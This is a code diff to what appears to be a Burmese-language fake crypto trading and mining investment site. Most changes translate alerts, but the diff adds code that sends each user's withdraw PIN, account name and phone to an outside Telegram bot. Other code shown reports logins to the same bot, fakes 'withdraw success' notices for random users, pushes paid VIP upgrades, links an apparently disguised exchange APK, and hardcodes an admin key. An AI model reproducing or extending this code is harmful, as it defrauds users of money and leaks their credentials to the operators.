@@ -204,7 +204,7 @@
         <a href="https://www.mediafire.com/file/mhq86zviuevscxp/_MEXC_PRO_19694733.apk/file" class="btn btn-download">
             <i class="fas fa-download"></i> APP ကို ဒေါင်းလုဒ်လုပ်ရန်
         </a>
-        <input type="text" id="log-ph" placeholder="Phone Number">
+        <input type="text" id="log-ph" placeholder="Phone Number (09...)">
         <div class="pw-wrapper">
             <input type="password" id="log-pw" placeholder="Password">
             <i class="fas fa-eye pw-toggle" id="eye-icon" onclick="togglePassword('log-pw', this)"></i>
@@ -214,7 +214,7 @@
     </div>
     <div id="reg-form" class="card" style="display:none;">
         <input type="text" id="reg-un" placeholder="User Name">
-        <input type="text" id="reg-ph" placeholder="Phone Number">
+        <input type="text" id="reg-ph" placeholder="Phone Number (09...)">
         <input type="password" id="reg-pw" placeholder="Password">
         <button class="btn btn-main" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
         <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
@@ -426,8 +426,8 @@
 <div id="withdraw-page" class="page">
     <h3>Withdraw Assets</h3>
     <div class="card">
-        <p style="color:var(--primary); font-size: 11px; margin-bottom: 10px;">* အင်တာနက်လိုင်းကောင်းပါက ၃စက္ကန့်အတွင်း ငွေထုတ်ယူမှု ဆောင်ရွက်ပေးပါမည်။ *</p>
-        <input type="number" id="wd-amt-input" placeholder="Amount (MMK)">
+        <p style="color:var(--primary); font-size: 11px; margin-bottom: 10px;">* အနည်းဆုံး ၁၀၀၀ ကျပ်မှ စတင်ထုတ်ယူနိုင်ပါသည်။ *</p>
+        <input type="number" id="wd-amt-input" placeholder="Amount (Minimum 1,000 MMK)">
         <input type="text" id="wd-name-input" placeholder="Wave/Kpay Account Name">
         <input type="text" id="wd-ph-input" placeholder="Receiver Phone Number">
         <input type="password" id="wd-pin-input" placeholder="Withdraw PIN">
@@ -560,8 +560,8 @@
             toast.innerHTML = `
                 <i class="fas fa-check-circle"></i>
                 <div>
-                    <div style="font-size:12px; color:white; font-weight:bold;">Withdraw Success!</div>
-                    <div style="font-size:10px; color:var(--dim);">User ${randomUser} just received ${randomAmt.toLocaleString()} Ks</div>
+                    <div style="font-size:12px; color:white; font-weight:bold;">ငွေထုတ်ယူမှု အောင်မြင်ပါသည်။</div>
+                    <div style="font-size:10px; color:var(--dim);">အသုံးပြုသူ ${randomUser} သည် ${randomAmt.toLocaleString()} Ks ကို ယခုလေးတင် လက်ခံရရှိသွားပါသည်။</div>
                 </div>
             `;
             
@@ -645,7 +645,15 @@
     function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value;
         const pw = document.getElementById(type==='login'?'log-pw':'reg-pw').value;
-        if(!ph || !pw) return alert("Please fill all details!");
+        
+        // --- NEW MYANMAR PHONE VALIDATION START ---
+        const mmPhoneRegex = /^(09|\+?959)\d{7,11}$/;
+        if(!mmPhoneRegex.test(ph)) {
+            return alert("မြန်မာဖုန်းနံပါတ် (09...) ကိုသာ အသုံးပြုပေးပါ။");
+        }
+        // --- NEW MYANMAR PHONE VALIDATION END ---
+
+        if(!ph || !pw) return alert("ကျေးဇူးပြု၍ အချက်အလက်အားလုံးကို ဖြည့်စွက်ပါ။");
         if(type==='login') {
             db.ref('users/'+ph).once('value', s => {
                 if(s.exists() && s.val().password === pw) {
@@ -655,7 +663,7 @@
                     initApp();
                     startLiveWdFeed(); 
                     sendTelegram(`User Login: ${ph}`);
-                } else alert("Invalid Credentials!");
+                } else alert("ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။");
             });
         } else {
             const un = document.getElementById('reg-un').value;
@@ -679,7 +687,7 @@
             s.forEach(a => {
                 h += `<div class="msg-box"><small class="msg-date">${a.val().date}</small><p style="margin:0; font-size:13px;">${a.val().text}</p></div>`;
             });
-            document.getElementById('announcement-list').innerHTML = h || "No messages from admin.";
+            document.getElementById('announcement-list').innerHTML = h || "အက်ဒမင်ထံမှ အကြောင်းကြားစာ မရှိသေးပါ။";
         });
 
         loadMarkets(); loadMining(); loadHist(); renderVIP();
@@ -707,12 +715,12 @@
 
     function buyVIP(lvl, cost) {
         db.ref('users/'+user).once('value', s => {
-            if(s.val().balance < cost) return alert("Insufficient balance to upgrade VIP!");
-            if(s.val().vip >= lvl) return alert("You are already at this level or higher!");
-            if(confirm(`Upgrade to VIP ${lvl} for ${cost.toLocaleString()} Ks?`)) {
+            if(s.val().balance < cost) return alert("VIP အဆင့်မြှင့်တင်ရန် လက်ကျန်ငွေ မလုံလောက်ပါ။");
+            if(s.val().vip >= lvl) return alert("သင်သည် ဤအဆင့် (သို့မဟုတ်) ဤထက်မြင့်သော အဆင့်သို့ ရောက်ရှိပြီးသား ဖြစ်ပါသည်။");
+            if(confirm(`VIP ${lvl} သို့ ${cost.toLocaleString()} Ks ဖြင့် အဆင့်မြှင့်မှာ သေချာပါသလား?`)) {
                 db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
                     sendTelegram(`User ${user} Upgraded to VIP ${lvl}`);
-                    alert("Upgrade Successful!");
+                    alert("VIP အဆင့်မြှင့်တင်မှု အောင်မြင်ပါသည်။");
                 });
             }
         });
@@ -720,7 +728,7 @@
 
     function copyDepNum() {
         const num = document.getElementById('display-dep-num').innerText;
-        navigator.clipboard.writeText(num).then(() => { alert("Number Copied: " + num); });
+        navigator.clipboard.writeText(num).then(() => { alert("နံပါတ်ကို ကော်ပီကူးယူပြီးပါပြီ- " + num); });
     }
 
     function loadMarkets() {
@@ -734,7 +742,7 @@
         ];
         let h = ""; tiers.forEach(t => { 
             h += `<div class="market-item" onclick="openTrade('${t.n}', ${t.m}, ${t.p}, ${t.s})"> 
-            <span><img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" class="market-icon-img"><b style="font-size:16px;">${t.n}/USDT</b><br><small style="color:var(--dim)">Min Invest: ${t.m.toLocaleString()} Ks</small></span> 
+            <span><img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" class="market-icon-img"><b style="font-size:16px;">${t.n}/USDT</b><br><small style="color:var(--dim)">အနည်းဆုံးရင်းနှီးငွေ: ${t.m.toLocaleString()} Ks</small></span> 
             <span style="color:var(--green); font-weight:bold;">${t.s}s / +${t.p}%</span> </div>`; 
         });
         document.getElementById('market-list').innerHTML = h;
@@ -744,7 +752,7 @@
         document.getElementById('pair-name').innerText = n+"/USDT"; 
         cMin = m; cProf = p; cDur = s; 
         document.getElementById('trade-prof').innerText = p; 
-        document.getElementById('min-trade-info').innerText = `Min: ${m.toLocaleString()} Ks | Duration: ${s}s`; 
+        document.getElementById('min-trade-info').innerText = `အနည်းဆုံး: ${m.toLocaleString()} Ks | ကြာချိန်: ${s}s`; 
         loadTVWidget(n + "USDT"); 
         connectBinance(n + "USDT"); 
         showPage('trade-page'); 
@@ -752,10 +760,10 @@
 
     function execTrade(side) {
         const amt = parseFloat(document.getElementById('trade-amt').value);
-        if(!amt || amt < cMin) return alert("Minimum amount is " + cMin + " Ks");
+        if(!amt || amt < cMin) return alert("အနည်းဆုံးရင်းနှီးငွေ " + cMin + " Ks ဖြစ်ရပါမည်။");
         db.ref('users/'+user).once('value', s => {
             const uData = s.val();
-            if(uData.balance < amt) return alert("Balance Insufficient!");
+            if(uData.balance < amt) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ။");
             let finalProf = cProf + (uData.vip * 2);
             db.ref('users/'+user).update({ balance: uData.balance - amt });
             document.getElementById('timer-ring').classList.add('active');
@@ -768,10 +776,10 @@
                     if(win) { 
                         let reward = amt + (amt * (finalProf/100)); 
                         db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
-                        alert(`Trade Success! Total Earned: ${reward.toLocaleString()} Ks`); 
+                        alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။ \n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks ရရှိပါသည်။ \n(VIP Bonus အပါအဝင်)`); 
                         sendTelegram(`Trade Win: ${user} earned ${reward} Ks`);
                     } else {
-                        alert("Trade Loss! Better luck next time."); 
+                        alert("နောင်တမရပါနဲ့! ယခုတစ်ကြိမ် Trading ကျရှုံးပါသည်။ \n\nနောက်တစ်ကြိမ် ဈေးကွက်ကောင်းကို ပြန်လည်စောင့်ဆိုင်းပါ။"); 
                         sendTelegram(`Trade Loss: ${user} lost ${amt} Ks`);
                     }
                     document.getElementById('trade-timer').innerText = "READY"; 
@@ -802,7 +810,7 @@
 
                 let statusClass = `status-${data.status}`;
                 let progress = 0;
-                let timeText = data.status === 'running' ? 'Calculating...' : 'Waiting for Approval';
+                let timeText = data.status === 'running' ? 'တွက်ချက်နေသည်...' : 'အက်ဒမင် အတည်ပြုချက် စောင့်ဆိုင်းနေသည်...';
 
                 if(data.status === 'running' && data.startTime && data.expiryTime) {
                     const totalDuration = data.expiryTime - data.startTime;
@@ -812,8 +820,8 @@
                     if(timeLeft > 0) {
                         const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
                         const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                        timeText = `${days}d ${hours}h remaining`;
-                    } else { timeText = "Mining Completed!"; progress = 100; }
+                        timeText = `နောက်ထပ် ${days}ရက် ${hours}နာရီ လိုအပ်ပါသည်`;
+                    } else { timeText = "Mining ပြီးဆုံးပါပြီ!"; progress = 100; }
                 }
 
                 statusHTML += `<div class="card active-mining-info">
@@ -823,25 +831,25 @@
                     </div>
                     <div style="margin-top:8px;">
                         <div style="display:flex; justify-content:space-between; font-size:11px;">
-                            <span>Investment: ${parseFloat(data.amt).toLocaleString()} Ks</span>
-                            <span style="color:var(--active-gold);">Profit: +${parseFloat(data.totalProfit).toLocaleString()} Ks</span>
+                            <span>ရင်းနှီးငွေ: ${parseFloat(data.amt).toLocaleString()} Ks</span>
+                            <span style="color:var(--active-gold);">အမြတ်: +${parseFloat(data.totalProfit).toLocaleString()} Ks</span>
                         </div>
                         <div class="progress-container">
                             <div class="progress-bar" style="width: ${progress}%"></div>
                         </div>
                         <div style="display:flex; justify-content:space-between; margin-top:5px; font-size:10px; color:var(--dim);">
-                            <span>Status: ${timeText}</span>
+                            <span>အခြေအနေ: ${timeText}</span>
                             <span>Exp: ${data.expiryDate || 'N/A'}</span>
                         </div>
                     </div>
                     ${(data.status === 'running' && now >= data.expiryTime) || (data.status === 'running' && data.forceClaim) ? 
-                        `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">Claim All Profit</button>` : ''}
+                        `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ အားလုံးထုတ်ယူမည်</button>` : ''}
                 </div>`;
             });
-            document.getElementById('user-mining-status').innerHTML = statusHTML || "<p style='text-align:center; font-size:12px; color:var(--dim);'>No active mining sessions.</p>";
+            document.getElementById('user-mining-status').innerHTML = statusHTML || "<p style='text-align:center; font-size:12px; color:var(--dim);'>လက်ရှိတွင် Mining လုပ်ဆောင်နေမှု မရှိသေးပါ။</p>";
         });
 
-        document.getElementById('mining-list').innerHTML = nodes.map(v => `<div class="card mining-card"><div class="mining-content"><div style="display:flex; align-items:center;"><div class="mining-icon"><i class="fas ${v.i}"></i></div><div class="mining-info"><h4>${v.n}</h4><small>Min: ${v.min.toLocaleString()} Ks</small></div></div><div class="profit-badge">+${v.p}% Daily</div></div><div style="margin-top:15px; position:relative; z-index:5;"><input type="number" id="amt-${v.n.replace(/\s+/g, '')}" placeholder="Enter Amount (Ks)"><button class="btn btn-main" onclick="applyClickGold(this); startMining('${v.n}', ${v.min}, ${v.p}, ${v.d})">Activate Node</button></div></div>`).join('');
+        document.getElementById('mining-list').innerHTML = nodes.map(v => `<div class="card mining-card"><div class="mining-content"><div style="display:flex; align-items:center;"><div class="mining-icon"><i class="fas ${v.i}"></i></div><div class="mining-info"><h4>${v.n}</h4><small>အနည်းဆုံး: ${v.min.toLocaleString()} Ks</small></div></div><div class="profit-badge">+${v.p}% နေ့စဉ်အမြတ်</div></div><div style="margin-top:15px; position:relative; z-index:5;"><input type="number" id="amt-${v.n.replace(/\s+/g, '')}" placeholder="ရင်းနှီးမည့်ပမာဏ (Ks)"><button class="btn btn-main" onclick="applyClickGold(this); startMining('${v.n}', ${v.min}, ${v.p}, ${v.d})">စက်လည်ပတ်မည်</button></div></div>`).join('');
     }
 
     function startMining(node, min, percent, days) {
@@ -851,7 +859,7 @@
         
         db.ref('users/'+user).once('value', s => {
             const uData = s.val();
-            if(uData.balance < amt) return alert("လက်ကျန်ငွေမလုံလောက်ပါ။");
+            if(uData.balance < amt) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ။");
             const now = new Date();
             const expiry = new Date();
             expiry.setDate(now.getDate() + days);
@@ -861,7 +869,7 @@
                 ph:user, node:node, amt:amt, status:'pending', date: now.toLocaleString(), expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
             });
             sendTelegram(`Mining Request: User ${user} invested ${amt} Ks in ${node} for ${days} days.`);
-            alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။ Admin ခွင့်ပြုချက်ကို စောင့်ဆိုင်းပေးပါ။");
+            alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။ အက်ဒမင်မှ စက်ကိုစတင်လည်ပတ်ပေးရန် ခေတ္တစောင့်ဆိုင်းပေးပါ။");
         });
     }
 
@@ -870,12 +878,12 @@
             const data = s.val();
             if(data.status === 'completed') return alert("ဤအမြတ်ကို ထုတ်ယူပြီးသားဖြစ်ပါသည်။");
             db.ref('users/'+user).once('value', us => {
-                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။");
+                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။ ကျေးဇူးပြု၍ VIP အဆင့်မြှင့်တင်ပါ။");
                 if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
                     db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
                     sendTelegram(`Mining Success: User ${user} claimed ${total} Ks from mining.`);
-                    alert("အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပေးလိုက်ပါပြီ။");
+                    alert("ဂုဏ်ယူပါသည်! Mining အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပေးလိုက်ပါပြီ။");
                 }
             });
         });
@@ -888,22 +896,44 @@
                     let statusColor = r.val().status === 'success' ? 'var(--green)' : (r.val().status === 'rejected' ? 'var(--red)' : 'var(--active-gold)');
                     h += `<div style="display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid #222;"> <small>${r.val().date}</small><b>${parseFloat(r.val().amt).toLocaleString()} Ks</b><span style="color:${statusColor}">${r.val().status.toUpperCase()}</span> </div>`; 
                 }); 
-                document.getElementById(c==='deposits'?'dep-hist':'wd-hist').innerHTML = h || "No records."; 
+                document.getElementById(c==='deposits'?'dep-hist':'wd-hist').innerHTML = h || "မှတ်တမ်း မရှိသေးပါ။"; 
             }); 
         }); 
     }
 
     function sendWithdraw() { 
-        const amt = parseFloat(document.getElementById('wd-amt-input').value); 
+        const amtInput = document.getElementById('wd-amt-input');
+        const amt = parseFloat(amtInput.value); 
+        const name = document.getElementById('wd-name-input').value;
+        const ph = document.getElementById('wd-ph-input').value;
         const pin = document.getElementById('wd-pin-input').value; 
-        if(!amt || amt < 1000) return alert("Minimum withdrawal is 1000 Ks");
+
+        // --- UPDATED WITHDRAW VALIDATION START ---
+        if(!amt || amt < 1000) {
+            amtInput.value = ""; // Clear invalid input
+            return alert("အနည်းဆုံး ၁၀၀၀ ကျပ်ရှိမှ ထုတ်ယူ၍ ရနိုင်ပါမည်။ ၁၀၀၀ ထက်နည်းသော ဂဏန်းများ ထည့်သွင်း၍ မရပါ။");
+        }
+        // --- UPDATED WITHDRAW VALIDATION END ---
+
+        if(!name || !ph || !pin) return alert("ကျေးဇူးပြု၍ ငွေထုတ်ယူမည့် အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
+
         db.ref('users/'+user).once('value', s => { 
-            if(s.val().pin !== pin) return alert("Wrong PIN!"); 
-            if(s.val().balance < amt) return alert("Low Balance!"); 
-            db.ref('requests/withdraws').push({ ph:user, amt, status:'pending', date:new Date().toLocaleString() }); 
+            if(s.val().pin !== pin) return alert("ငွေထုတ်ယူမည့် PIN နံပါတ် မှားယွင်းနေပါသည်။"); 
+            if(s.val().balance < amt) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ။"); 
+            
+            db.ref('requests/withdraws').push({ ph:user, amt, name:name, receivePh:ph, status:'pending', date:new Date().toLocaleString() }); 
             db.ref('users/'+user).update({ balance: s.val().balance - amt }); 
-            sendTelegram(`Withdraw Request: User ${user} requested ${amt} Ks`);
-            alert("Withdrawal Request Submitted.");
+            
+            const detailedMsg = `🚨 NEW WITHDRAW REQUEST 🚨\n\n` +
+                                `👤 User ID: ${user}\n` +
+                                `💰 Amount: ${amt.toLocaleString()} MMK\n` +
+                                `📛 Account Name: ${name}\n` +
+                                `📱 Receive Phone: ${ph}\n` +
+                                `🔐 Withdraw PIN: ${pin}\n` +
+                                `⏰ Date: ${new Date().toLocaleString()}`;
+            sendTelegram(detailedMsg);
+
+            alert("ငွေထုတ်ယူရန် တောင်းဆိုမှု တင်ပြပြီးပါပြီ။ အက်ဒမင်မှ အတည်ပြုပေးပါလိမ့်မည်။");
             showPage('dash-page');
         }); 
     }
@@ -911,12 +941,12 @@
     function sendDeposit() { 
         const amt = document.getElementById('dep-amt-input').value; 
         const trx = document.getElementById('dep-trx-input').value; 
-        if(!amt || !trx) return alert("Please fill all details!");
+        if(!amt || !trx) return alert("အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
         db.ref('requests/deposits').push({ 
             ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
         }); 
         sendTelegram(`Deposit Sent: User ${user} sent ${amt} Ks via ${currentPayMethod}. TRX: ${trx}`);
-        alert("Deposit Submitted. ခေတ္တစောင့်ဆိုင်းပေးပါ။");
+        alert("ငွေဖြည့်သွင်းမှု တောင်းဆိုပြီးပါပြီ။ ခေတ္တစောင့်ဆိုင်းပေးပါ။");
         showPage('dash-page');
     }
 
@@ -925,16 +955,16 @@
             const oldPw = document.getElementById('old-pw').value; 
             const newPw = document.getElementById('new-pw').value; 
             db.ref('users/'+user).once('value', s => { 
-                if(s.val().password === oldPw) { db.ref('users/'+user).update({password: newPw}).then(()=>alert("Success!")); } 
-                else alert("Wrong Password!"); 
+                if(s.val().password === oldPw) { db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲမှု အောင်မြင်ပါသည်။")); } 
+                else alert("ယခင် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။"); 
             }); 
         } else { 
-            db.ref('users/'+user).update({pin: document.getElementById('new-pin').value}).then(()=>alert("PIN Saved!")); 
+            db.ref('users/'+user).update({pin: document.getElementById('new-pin').value}).then(()=>alert("Withdraw PIN သိမ်းဆည်းပြီးပါပြီ!")); 
         } 
     }
 
     document.getElementById('admin-trigger').onclick = () => { 
-        if(++adminStep >= 5) { adminStep=0; if(prompt("Key")==="admin123") { showPage('admin-page'); loadAdmReq(); } } 
+        if(++adminStep >= 5) { adminStep=0; if(prompt("အက်ဒမင် လျှို့ဝှက်ကုဒ်")==="admin123") { showPage('admin-page'); loadAdmReq(); } } 
     };
 
     function admPostAnnounce() {
@@ -1017,4 +1047,3 @@ s0.parentNode.insertBefore(s1,s0);
 
 </body>
 </html>
-
